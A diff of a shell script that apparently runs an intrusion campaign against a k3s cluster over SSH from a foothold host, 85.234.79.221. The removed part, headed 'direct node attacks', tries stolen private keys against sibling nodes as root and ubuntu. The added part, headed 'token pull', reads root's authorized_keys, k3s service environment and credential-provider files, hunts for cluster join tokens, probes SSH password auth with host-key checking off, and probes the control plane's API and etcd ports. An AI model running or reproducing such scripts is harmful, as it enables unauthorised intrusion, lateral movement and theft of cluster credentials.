@@ -1,30 +1,26 @@
-echo "=== 221 direct node attacks ==="
-cat > /tmp/r6.sh <<'RSH'
+echo "=== 221 token pull ==="
+cat > /tmp/r7.sh <<'RSH'
 #!/bin/bash
-echo "=== root ssh dir ==="
-sudo ls -la /root/.ssh/ 2>/dev/null
-echo "=== k3s token hunt ==="
-sudo cat /etc/rancher/k3s/config.yaml 2>/dev/null; sudo ls -la /etc/rancher/k3s/ 2>/dev/null
-sudo cat /etc/systemd/system/k3s-agent.service 2>/dev/null | grep -A3 Environment
-sudo cat /var/lib/rancher/k3s/agent/etc/k3s-agent-load-balancer.json 2>/dev/null
-sudo grep -rlE "K3S_TOKEN|K10[0-9a-f]" /etc/systemd/system/ /root/ /var/lib/rancher/k3s/agent/ 2>/dev/null | head -5
-sudo grep -hoE "K10[0-9a-z:]+" /etc/systemd/system/k3s*.service /root/.bash_history 2>/dev/null | head -3
-echo "=== ssh auth methods on rx nodes ==="
-for ip in 31 87 103 109 184 233; do
-  m=$(ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@85.234.79.$ip true 2>&1 | head -1)
-  echo "  .79.$ip: $m"
+echo "=== k3s-agent.service.env ==="
+sudo cat /etc/systemd/system/k3s-agent.service.env 2>&1
+echo "=== config.yaml.d ==="
+sudo cat /etc/rancher/k3s/config.yaml.d/* 2>/dev/null | head -20
+echo "=== credential-provider ==="
+sudo cat /etc/rancher/k3s/credential-provider-config.yaml 2>/dev/null
+echo "=== sshd_pwd_check ==="
+sudo cat /root/.ssh/sshd_pwd_check.sh 2>/dev/null
+echo "=== root authorized_keys ==="
+sudo cat /root/.ssh/authorized_keys 2>/dev/null
+echo "=== auth methods probe ==="
+for ip in 31 103; do
+  echo "-- .79.$ip --"
+  ssh -vv -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@85.234.79.$ip true 2>&1 | grep -E "Authentications that can continue|Permission denied" | head -3
 done
-echo "=== key auth attempts ==="
-for key in /home/ubuntu/.ssh/id_ed25519 /root/.ssh/id_ed25519 /root/.ssh/id_rsa; do
-  sudo test -f $key || continue
-  for ip in 31 87 103 109 184 233; do
-    for u in root ubuntu; do
-      r=$(sudo ssh -i $key -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 $u@85.234.79.$ip 'hostname' 2>&1 | tail -1)
-      echo "  $key -> $u@.79.$ip: ${r:0:60}"
-    done
-  done
-done
+echo "=== listening 6443 on CP probe ==="
+curl -sk --max-time 5 https://100.83.208.122:6443/version -w "\nHTTP:%{http_code}\n" | head -c 200
+curl -sk --max-time 5 http://100.83.208.122:2379/version -w "\nHTTP:%{http_code}\n" | head -c 200
+curl -sk --max-time 5 https://100.83.208.122:9345 -w "\nHTTP:%{http_code}\n" -o /dev/null
 RSH
-chmod +x /tmp/r6.sh
-timeout 115 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r6.sh 2>&1 | head -80
-echo "=== B22DONE ==="
+chmod +x /tmp/r7.sh
+timeout 110 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r7.sh 2>&1 | head -60
+echo "=== B23DONE ==="
